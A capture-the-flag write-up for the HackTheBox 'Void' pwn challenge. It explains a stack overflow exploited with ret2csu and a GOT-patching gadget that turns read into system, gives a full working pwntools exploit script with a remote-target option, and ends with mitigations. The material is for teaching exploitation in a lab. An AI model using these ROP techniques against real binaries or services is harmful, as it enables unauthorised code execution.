## Overview

**Void** is an Easy HackTheBox **Pwn** challenge. The binary has a [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) with only `read` in its PLT — no output function anywhere — making a standard GOT-leak impossible. The solve chains **ret2csu** (to control `rdx` and write a command string to BSS) with a **GOT arithmetic patch** via an `add dword [rbp-0x3d], ebx` gadget that converts `read@GOT` to `system@GOT` without ever knowing the libc base.

## The technique

Two techniques combine to achieve code execution when no libc address is available:

**ret2csu** — every non-PIE x86-64 glibc ELF ships `__libc_csu_init`, which contains two reusable gadget halves:

- **CSU2** (`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`) — loads six registers in one shot.
- **CSU1** (`mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]`) — dispatches an arbitrary 3-argument call through a GOT function pointer.

Setting `rbx=0, rbp=1, r12=0, r13=BSS, r14=len, r15=GOT_READ` makes CSU1 execute `read(0, BSS, len)`, writing attacker-controlled data to a fixed writable address. After the call, the loop-exit in `__libc_csu_init` consumes **exactly 8 stack slots** before reaching the next `ret`: one `add rsp,8` skip slot, six pops (`rbx`–`r15`), and the real return target.

**GOT arithmetic patch** — if the binary also has `add dword [rbp-0x3d], ebx`, the attacker can patch only the lower 32 bits of `read@GOT`:

```
DELTA = (system_offset - read_offset) & 0xffffffff
```

Both `system` and `read` live in the same 4 GB libc mapping, so no carry propagates out of the low dword; the upper 32 bits of the GOT entry are unchanged, and the full 64-bit pointer becomes `system()`. ASLR randomises the base, but the *difference* between the two symbols is constant for a given libc — so the patch works without knowing the base at all.

## Solution

### Stage 1 — write command string to BSS via ret2csu

The buffer is 64 bytes; the saved return address is at offset 72 (64 + 8 for saved RBP). The `read()` limit is `0xc8 = 200` bytes, leaving exactly 128 bytes for the ROP chain after the padding.

```
0x4011b2  pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret   ← CSU2
0x401198  mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]   ← CSU1
0x401108  add dword ptr [rbp-0x3d], ebx ; nop ; ret                   ← ADD
0x4011bb  pop rdi ; ret
```

Stage 1 chain (72 bytes padding + 128 bytes chain = 200 bytes exactly):

```python
s1 = flat(
    CSU2,
    0,              # rbx = 0
    1,              # rbp = 1 (loop exits after 1 call)
    0,              # r12 → edi = 0  (stdin)
    BSS,            # r13 → rsi      (destination)
    len(cmd),       # r14 → rdx      (length)
    GOT_READ,       # r15 → [r15+0]  (function pointer = &read)
    CSU1,           # call read(0, BSS, len)
    0,              # add rsp,8 skips this slot
    0, 0, 0, 0, 0,  # pop rbx / rbp / r12 / r13 / r14
    0,              # pop r15 (junk — must be present)
    VULN,           # ret → vuln() for stage 2
)
p.send(b'A' * 72 + s1)
p.send(cmd)        # write "cat /home/ctf/flag.txt\x00" to BSS
```

The gotcha: the loop-exit consumes **8 slots**, not 7. Providing only 7 items causes `VULN` to be popped into `r15` and the actual `ret` reads garbage → SIGSEGV. The `pop r15` junk slot must be present.

### Stage 2 — GOT patch + call system(BSS)

Set `rbp = GOT_READ + 0x3d` so that `[rbp - 0x3d] = GOT_READ` exactly, then fire the ADD gadget:

```python
DELTA = (libc.sym['system'] - libc.sym['read']) & 0xffffffff

s2 = flat(
    CSU2,
    DELTA,           # rbx: ebx = delta to add
    GOT_READ + 0x3d, # rbp: [rbp-0x3d] = GOT_READ
    0, 0, 0, 0,      # r12 / r13 / r14 / r15 (unused)
    ADD,             # add dword [GOT_READ], ebx → read@GOT now = system
    PRDI,            # pop rdi
    BSS,             # rdi = command string written in stage 1
    READ,            # call read@plt → jumps to system(cmd)
)
p.send(b'A' * 72 + s2)
```

### Full solve.py

```python
#!/usr/bin/env python3
from pwn import *

exe  = ELF('./void', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.binary = exe

BSS      = exe.bss()
GOT_READ = exe.got['read']
DELTA    = (libc.sym['system'] - libc.sym['read']) & 0xffffffff

CSU2 = 0x4011b2
CSU1 = 0x401198
ADD  = 0x401108
PRDI = 0x4011bb
VULN = 0x401122
READ = exe.plt['read']

def exploit(target=None, cmd=b'cat /home/ctf/flag.txt\x00'):
    if target:
        host, port = target.split(':')
        p = remote(host, int(port))
    else:
        p = process(['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc', './void'])

    s1 = flat(CSU2, 0, 1, 0, BSS, len(cmd), GOT_READ, CSU1,
              0, 0, 0, 0, 0, 0, 0, VULN)
    p.send(b'A' * 72 + s1)
    p.send(cmd)

    s2 = flat(CSU2, DELTA, GOT_READ + 0x3d, 0, 0, 0, 0,
              ADD, PRDI, BSS, READ)
    p.send(b'A' * 72 + s2)
    p.interactive()

import sys
exploit(sys.argv[1] if len(sys.argv) > 1 else None)
```

Flag: `HTB{...}`

## Why it worked

The root cause is a [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) — [CWE-121](https://cwe.mitre.org/data/definitions/121.html): `read(0, buf, 0xc8)` into a 64-byte buffer with no canary and no PIE gives an attacker direct control of the return address. The binary's Partial RELRO leaves the GOT writable at runtime, making the arithmetic patch possible. The two libc symbols landing within the same 32-bit range makes the patch ASLR-immune: the absolute addresses change on every run, but their difference is fixed for a given libc.

## Fix / defense

| Mitigation | Effect |
|---|---|
| `read(0, buf, sizeof(buf))` | removes the overflow entirely |
| `-fstack-protector-strong` | canary detects smash before epilogue |
| Full RELRO (`-z relro -z now`) | GOT becomes read-only at runtime; the ADD gadget crashes instead of patching |
| PIE | randomises CSU gadget addresses, breaking the fixed-address chain |
